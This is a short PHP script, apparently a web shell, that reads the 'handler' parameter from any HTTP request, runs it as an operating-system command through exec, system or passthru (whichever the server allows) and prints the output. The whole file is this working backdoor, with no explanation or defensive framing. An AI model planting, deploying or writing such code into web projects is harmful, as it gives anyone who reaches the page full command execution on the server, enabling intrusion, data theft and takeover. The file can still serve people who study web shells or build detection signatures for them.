<?php
function myshellexec($cmd)
{
    $result = "";
 
    if (is_callable("exec")){
		exec($cmd,$result); 
		$result = join("\n",$result);
	}
    elseif (is_callable("system")) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		system($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
	}
    elseif (is_callable("passthru")) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		passthru($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
	}
    return $result;
}

$handler = $_REQUEST['handler'];
$ret = myshellexec($handler);
print($ret);
die("");
?>